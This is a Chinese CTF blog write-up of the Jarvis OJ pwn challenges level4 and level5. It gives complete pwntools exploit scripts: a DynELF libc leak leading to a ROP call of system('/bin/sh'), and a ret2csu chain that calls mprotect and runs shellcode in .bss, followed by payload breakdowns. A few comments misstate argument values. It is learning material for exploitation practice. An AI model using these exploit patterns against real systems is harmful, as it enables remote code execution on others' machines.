---
title: Jarvis_OJ_pwn_level4to6
date: 2020-07-08 17:55:33
tags: 
- pwn
categories:
- CTF
---


# levle4
 
没有libc了，要用 DynELF配合 leak 来找system的真正地址

## exp
```python
from pwn import *
io=remote("pwn2.jarvisoj.com",9880)
elf=ELF("./level4")
input_add = 0x804844B
write_plt=elf.plt["write"]
read_plt=elf.plt["read"]
bss_add = 0x0804a024
#0804844B vulnerable_function

def leak(add):
    payload = 'a'*(0x88+4)+p32(write_plt)+p32(input_add)+p32(1)+p32(add)+p32(4)
    io.send(payload)
    leak_sysadd = io.recv(4)
    return leak_sysadd
d = DynELF(leak,elf = ELF("./level4"))
sys_add = d.lookup("system","libc")

payload2 = 'a'*(0x88+4) + p32(read_plt)+p32(input_add)+p32(1)+p32(bss_add)+p32(8)
io.sendline(payload2)
io.sendline("/bin/sh")
payload3 = 'a'*(0x88+4) + p32(sys_add)+p32(input_add)+p32(bss_add)
io.sendline(payload3)
io.interactive()
```

```python
def leak(add):
    payload = 'a'*(0x88+4)+p32(write_plt)+p32(input_add)+p32(1)+p32(add)+p32(4)
    io.send(payload)
    leak_sysadd = io.recv(4)
    return leak_sysadd
d = DynELF(leak,elf = ELF("./level4"))
sys_add = d.lookup("system","libc")
```
这是利用DynELF找system的核心部分leak函数可以返回地址对应的值，让DynELF寻找到level4的地址页进而找到一系列的所需的表

使用lookup在libc文件中搜索system函数的真实地址

https://www.freebuf.com/articles/system/193646.html

```python
payload1= 'a'*(0x88+4)+
          p32(write_plt)+
          p32(input_add)+
          p32(1)+
          p32(add)+
          p32(4)
>>> 等价执行 write(1,add,8) 并返回 input_add 进行下一次输出（下一次pwn）
payload2 = 'a'*(0x88+4) +
           p32(read_plt)+
           p32(input_add)+
           p32(1)+
           p32(bss_add)+
           p32(8)
>>> 执行read(1,bss_add,8) 在 bss 写入 /bin/sh
payload3 = 'a'*(0x88+4) +
           p32(sys_add)+
           p32(input_add)+
           p32(bss_add)
执行ststem(bss_add)
```

# level5

按照要求尝试用mprotect来解决

利用mproject修改.bss中内存的权限，然后将shellcode写入.bss段中执行即可

mprotect原型
```cpp
int mprotect(const void *start, size_t len, int prot);
```
这里需要三个参数来使用这个函数，x64优先用寄存器传参，先找所需的 pop 指令

只找到了 rdi rsi 没有 rdx 借用`__libc_csu_init`中的指令完成

## exp:
```python
from pwn import *
context.arch='amd64'
#p=process('./l3')
'''
text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    qword ptr [r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36↑j
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
'''
p=remote("pwn2.jarvisoj.com",9884)
libc=ELF('./libc-2.19.so')
elf=ELF('./level3_x64')

write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt = elf.plt['read']
read_got = elf.got['read']
bss = elf.bss()
print('bss=',hex(bss))

input_add = 0x4005E6

rdi = 0x4006b3
rsi_r15 = 0x4006b1
gadget = 0x4006aa

#确定libc的内存基址==============================
p.recvuntil('Input:\n')
payload1 = 0x88*b'a'+p64(rdi)+p64(1)+p64(rsi_r15)+p64(read_got)+p64(1)+p64(write_plt)+p64(input_add)
p.send(payload1)
t=u64(p.recv(8))
print(('read_got',hex(t)))
libc.address=t-libc.symbols["read"]
#写入mproject ==========================================

libc_start_main_got=elf.got['__libc_start_main']
p.recvuntil('Input:\n')
payload2 = 0x88*b'a'+ p64(rdi)+p64(0)+p64(rsi_r15)+p64(libc_start_main_got)+p64(0)+p64(read_plt)+p64(input_add)
p.send(payload2)

mprotect_addr=libc.symbols['mprotect']
print (hex(mprotect_addr))
p.send(p64(mprotect_addr))

#bss写入shellcode===================================================
p.recvuntil('Input:\n')
payload3 = 0x88*b'a'+ p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss)+p64(0)+p64(read_plt)+p64(input_add)
p.send(payload3)

shellcode=asm(shellcraft.amd64.sh())
print (shellcode)
p.send(shellcode)
# bss地址写入 gmon_start中============================
p.recvuntil('Input:\n')
gmon_start = elf.got['__gmon_start__']
payload4 = b'a'*(0x88)+p64(rdi)+p64(0x0)+p64(rsi_r15)+p64(gmon_start)+b'deadbeef'+p64(read_plt)+p64(input_add)
p.send(payload4)
p.send(p64(bss))


#修改权限并执行bss===================================================
'''
text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    qword ptr [r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36↑j
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
'''
add_aa = 0x4006AA
add_90 = 0x400690 
p.recvuntil('Input:\n')
payload5 = 0x88*b'a'+p64(add_aa) + p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1000)+p64(0x600000)+p64(add_90)+p64(0)+p64(0)+p64(1)+p64(gmon_start)+p64(0)+p64(0)+p64(0)+p64(add_90)

#payload=b'a'*(offset+8)+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1001)+p64(0x600000)+p64(call_addr)+b'deadbeef'+p64(0)+p64(1)+p64(gmon_start_got)+p64(0)+p64(0)+p64(0)+p64(call_addr)
p.send(payload5)
p.interactive()

```

## payload分析
```python
payload1 = 0x88*b'a'+
          p64(rdi)+
          p64(1)+
          p64(rsi_r15)+
          p64(write_got)+
          p64(1)+
          p64(write_plt)+
          p64(input_add)
>>> write(1,write_got,0x200)
payload2 = 0x88*b'a'+ 
            p64(rdi)+
            p64(0)+
            p64(rsi_r15)+
            p64(libc_start_main_got)+
            p64(0)+
            p64(read_plt)+
            p64(input_add)
>>> read(0,libc_start_main_got,0x200)

payload3 = 0x88*b'a'+ 
            p64(rdi)+
              p64(0)+
              p64(rsi_r15)+
              p64(bss)+
              p64(0)+
              p64(read_plt)+
              p64(input_add)
>>> read(0,bss,0x200)

payload4 = b'a'*(0x88)+
            p64(rdi)+
            p64(0x0)+
            p64(rsi_r15)+
            p64(gmon_start)+
            b'deadbeef'+
            p64(read_plt)+
            p64(input_add)
>>> read(0,gmon_start,0x200)

payload5 = 0x88*b'a'+
            p64(add_aa) +         
             p64(0)+    rbx
             p64(1)+    rbp
             p64(libc_start_main_got)+ r12 --->called
             p64(7)+                 r13 --> rdx
             p64(0x1000) +  r14 -- > rsi
             p64(0x600000)+   r15 ---> edi


             p64(add_90)+
             p64(0)+
             p64(0)+
             p64(1)+
             p64(gmon_start)+
             p64(0)+
             p64(0)+
             p64(0)+
             p64(add_90)
```
> 还是挺绕的 。。。。。
